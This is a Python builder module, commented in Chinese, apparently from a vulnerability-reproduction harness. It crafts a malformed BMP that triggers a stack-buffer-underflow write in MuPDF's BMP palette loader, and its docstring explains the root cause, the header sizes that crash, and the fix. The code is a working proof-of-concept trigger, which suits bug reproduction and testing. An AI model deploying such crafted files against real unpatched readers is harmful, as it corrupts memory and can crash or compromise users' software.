"""S20（arvo:59500 / MuPDF BMP palette）构造器：palette 下溢导致栈上越界写。

缺陷（source/fitz/load-bmp.c: bmp_read_palette）：
    bitmap = begin + info->bitmapoffset;
    expected = fz_mini(info->colors, 1 << info->bitcount);
    present  = fz_mini(expected, (bitmap - p) / entry_size);   // 指针差是 signed
    ...
    if (present < expected) bmp_load_default_palette(ctx, info, present);

info->bitmapoffset 可以小于"当前解析位置 p"（p 已经越过 info header），
(bitmap - p) 于是为负 -> present 为负 -> bmp_load_default_palette(ctx, info, 负值)，
里面 for (i = readcolors; i < 16; i++) info->palette[3*i+...] 从负下标开始写，
越过 struct info 的栈红区 -> ASAN stack-buffer-underflow（WRITE of size 1 @ load-bmp.c:920）。

**触发要点（实测）**：负得够多才会写到 struct 之前。palette 在 struct info 里偏移约 60，
所以要求 3*readcolors < -60。readcolors = (bitmapoffset - p)/entry_size：
- BITMAPINFOHEADER(40)：p=54 -> 最多 -13（3*i=-39，还在 struct 内，不崩）
- BITMAPV4HEADER(108)：p=122 -> -30（3*i=-90，越过 struct 起点 -> 崩）✓
- BITMAPV5HEADER(124)：p=138 -> -34，同样崩
所以本构造器默认用 108 字节头 + bitmapoffset=0 + bitcount=4 + colors=0x20202020。

fix 版：colors==0 时置 expected=colors=1<<bitcount，且 bitmapoffset==0 时用 end-p 计算 present，
负值不再出现。
"""
from __future__ import annotations

import struct

MAGIC = b"BM"
DEFAULTS = {"header_size": 108, "bitmapoffset": 0, "bitcount": 4,
            "colors": 0x20202020, "width": 1, "height": 1, "pad": 64}

FIELDS = {
    "header_size": "int, DIB 头长度（40/52/56/108/124；默认 108，负下标才够深）",
    "bitmapoffset": "int, BMP 文件头里的像素偏移（默认 0，小于解析位置才会出现负 present）",
    "bitcount": "int, 位深（1/2/4/8 才有调色板；默认 4）",
    "colors": "int, DIB 里的 colors 字段（默认 0x20202020，会被 clamp 到 1<<bitcount）",
    "width": "int, 宽度", "height": "int, 高度",
    "pad": "int, 头后填充字节数（默认 64）",
}


class BmpResult:
    """构造结果（普通类：本模块可能被按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "bmp"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> BmpResult:
    """拼一个最小 BMP（BITMAPV4/V5 头 + colors 超大 + bitmapoffset 很小）。"""
    fields = dict(fields or {})
    used, dropped = {}, []
    params = dict(DEFAULTS)
    for key in ("header_size", "bitmapoffset", "bitcount", "colors", "width", "height", "pad"):
        if key in fields:
            try:
                params[key] = int(fields[key])
            except (TypeError, ValueError):
                return BmpResult(False, reason="%s 必须是整数" % key)
    if params["header_size"] not in (40, 52, 56, 64, 108, 124):
        return BmpResult(False, reason="header_size 只支持 40/52/56/64/108/124")
    if params["bitcount"] not in (1, 2, 4, 8):
        return BmpResult(False, reason="bitcount 必须是 1/2/4/8（才有调色板）")
    if params["bitmapoffset"] < 0 or params["pad"] < 0:
        return BmpResult(False, reason="bitmapoffset/pad 不能为负")
    used.update(params)
    for k in fields:
        if k not in FIELDS:
            dropped.append({"field": k, "reason": "bmp_palette 构造器不识别该字段"})

    dib = bytearray(params["header_size"])
    struct.pack_into("<I", dib, 0, params["header_size"])
    struct.pack_into("<i", dib, 4, params["width"])
    struct.pack_into("<i", dib, 8, params["height"])
    struct.pack_into("<H", dib, 12, 1)                       # planes
    struct.pack_into("<H", dib, 14, params["bitcount"])
    struct.pack_into("<I", dib, 16, 0)                       # BI_NONE
    struct.pack_into("<I", dib, 32, params["colors"] & 0xFFFFFFFF)
    body = bytes(dib) + b"\x00" * params["pad"]
    data = MAGIC + struct.pack("<IHHI", 14 + len(body), 0, 0, params["bitmapoffset"]) + body
    return BmpResult(True, data, used, dropped)


def proof_of_concept() -> bytes:
    res = build({})
    if not res.ok:
        raise RuntimeError("bmp_palette builder failed: " + res.reason)
    return res.data
